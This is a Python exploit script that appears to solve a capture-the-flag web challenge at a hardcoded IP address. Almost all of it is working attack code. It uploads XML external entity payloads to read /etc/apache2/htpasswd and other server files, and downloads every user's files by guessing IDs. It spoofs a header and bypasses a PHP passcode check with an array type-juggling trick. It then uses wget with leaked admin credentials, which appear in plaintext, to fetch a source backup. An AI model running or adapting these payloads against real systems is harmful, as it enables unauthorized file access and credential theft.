#!/usr/bin/env python
import IPython
import os
import random
import re
import requests
import sys

randalpha = lambda n: ''.join([chr(ord('A')+random.randint(0,25)) for _ in range(n)])

new_account = '--regen-creds' in sys.argv or not os.path.exists('web500_creds.txt')

def make_creds():
    creds = dict()
    if new_account:
        creds['username'] = randalpha(16)
        creds['password'] = randalpha(16)
        with open('web500_creds.txt', 'w') as f:
            f.write(repr(creds))
    else:
        with open('web500_creds.txt', 'r') as f:
            creds = eval(f.read())
    return creds

def progress_hook(response, *args, **kwargs):
    print('"%s": %d' % (response.url, response.status_code))

hooks = {'response': progress_hook}

baseurl = 'http://107.170.127.56'
session = requests.Session()
creds = make_creds()

if new_account:
    resp1 = session.post(baseurl+'/register.php', hooks=hooks, data={
        'username': creds['username'],
        'firstname': creds['username'],
        'lastname': creds['username'],
        'password': creds['password'],
        'repassword': creds['password'],
        'submit': 'Sign up',
        })
else:
    resp1 = session.post(baseurl+'/login.php', hooks=hooks, data={
        'username': creds['username'],
        'password': creds['password'],
        'submit': 'Login',
        })

'''
<form name="xml-upload" id="upload" enctype="multipart/form-data" action="settings.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000000" />
    <input name="upl" type="file" accept=".xml" style="margin-left: 175px;" />
    <p style="margin-top: 5px;">Max of 1 MB.</p>
    <input type="submit" value="Upload">
</form>
'''

def do_xxe(session, payload):
    resp = session.post(baseurl+'/settings.php', hooks=hooks, data={
        'MAX_FILE_SIZE': 1000000,
        'submit': 'Upload'
        }, files={
        'upl': ('xxe.xml', payload, 'text/xml')
        })
    #has_warnings = re.findall('(.*)<html>', resp.text, re.DOTALL)
    position = resp.text.find('<html>')
    if position > 0:
        warnings = re.findall('(<b>Warning</b>: .*)', resp.text[:position])
        for line in warnings:
            print(line)
    return re.findall('<textarea[^>]*name="bio">(.*)</textarea>\\s*<input type="submit" value="Update">\\s*</form>', resp.text, re.DOTALL)[0]

def arbitrary_file_read(session, fname):
    file_payload = '''
    <!DOCTYPE bio [ <!ELEMENT bio ANY >
    <!ENTITY xxe SYSTEM "file://{filename}" >]>
    <data>
    <item xml:id="id">1</item>
    <item xml:id="firstname">firstname</item>
    <item xml:id="lastname">lastname</item>
    <item xml:id="bio">&xxe;</item>
    </data>
    '''.format(filename=fname)
    cdata_attempt = '''
    <!DOCTYPE bio [ <!ELEMENT bio ANY >
        <!ENTITY file SYSTEM "file://{filename}">
        <!ENTITY passwd SYSTEM "file:///etc/passwd">
        <!ENTITY test "foo">
        <!ENTITY start "&#60;![CDATA[">
        <!ENTITY % end "]]>">
        <!ENTITY xxe "&file;">
    ]>
    <data>
    <item xml:id="id">1</item>
    <item xml:id="firstname">firstname</item>
    <item xml:id="lastname">lastname</item>
    <item xml:id="bio">&xxe;</item>
    </data>
    '''.format(filename=fname)
    base64_payload = '''
    <!DOCTYPE bio [ <!ELEMENT bio ANY >
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file://{filename}">
    ]>
    <data>
    <item xml:id="id">1</item>
    <item xml:id="firstname">firstname</item>
    <item xml:id="lastname">lastname</item>
    <item xml:id="bio">&xxe;</item>
    </data>
    '''.format(filename=fname)
    return do_xxe(session, base64_payload).decode('base64')

"""
def do_glob(session, path):
    glob_payload = '''
    <!DOCTYPE bio [ <!ELEMENT bio ANY >
        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=glob://{path}">
    ]>
    <data>
    <item xml:id="id">1</item>
    <item xml:id="firstname">firstname</item>
    <item xml:id="lastname">lastname</item>
    <item xml:id="bio">&xxe;</item>
    </data>
    '''.format(path=path)
    return do_xxe(session, glob_payload)
"""

def list_files_for_userid(session, id_):
    resp = session.post(baseurl, hooks=hooks, data={'accounts': id_, 'submit':'Show files'})
    #return re.findall('<a href.*bytes\)</a>', resp.text)
    has_things = re.findall('<h3 class="bars">Uploaded files</h3>\\s*<ul class="list-group">(.*)</ul>', resp.text, re.DOTALL)[0]
    ids = re.findall('name="downfileid" value="(\\d*)"', has_things)
    fnames = re.findall('\\)" >(.*) \\(\\d* bytes\\)</a>', has_things)
    return zip(ids, fnames)

def download_file_by_id(session, id_):
    resp = session.post(baseurl, hooks=hooks, data={'downfileid': id_, 'submit':'Show files'})
    return resp.text

def download_all_files(session, maxuser):
    files = dict()
    for user in range(maxuser):
        for (i, fname) in list_files_for_userid(session, user):
            print(user, i, fname)
            files[i] = (user, fname, download_file_by_id(session, i))
    with open('web500_files_up_to_%d' % maxuser, 'w') as f:
        f.write(repr(files))
    return files

def request_keys(session):
    session.headers['X-Forwarded-For'] = 'for=0.0.0.0; proto=http; by=253.254.255.256'
    '''
    function checkpw($code)
    {
        $len = strlen($code) - 1;
        $last = intval($code[$len]);
        if(!!$code && $code & 1 && $last % 2 == 0 && $code = "DirtyHarry99")
            return true;

        return false;
    }
    '''
    '''
    $ php -a
    php > $x = [0];
    php > echo $x & 1;
    1
    php > echo intval($x[strlen($x)-1]) % 2;
    PHP Warning:  strlen() expects parameter 1 to be string, array given in php shell code on line 1
    PHP Notice:  Undefined offset: -1 in php shell code on line 1
    0
    '''
    # as far as I can tell:
    # ($x & 1) is true because arrays are true, and true (as a number) is 1
    # strlen($x) is undefined, (undefined - 1) is -1, $x[-1] is undefined, and intval(undefined) is 0, which is even
    # yay PHP!
    resp = session.post(baseurl+'/keys.php', hooks=hooks, data={'passcode[]': "0"})
    return resp

print(download_file_by_id(session, 1))

print(arbitrary_file_read(session, '/etc/apache2/apache2.conf'))

print(arbitrary_file_read(session, '/etc/apache2/htpasswd'))

if not os.path.exists('web500_source.tar.gz'):
    os.system('wget --user=therealadmin --password=SEXYLOVE http://107.170.127.56/backups/backup.tar.gz --output-document ./web500_source.tar.gz')

resp_keys = request_keys(session)
print(resp_keys.text)

IPython.embed()
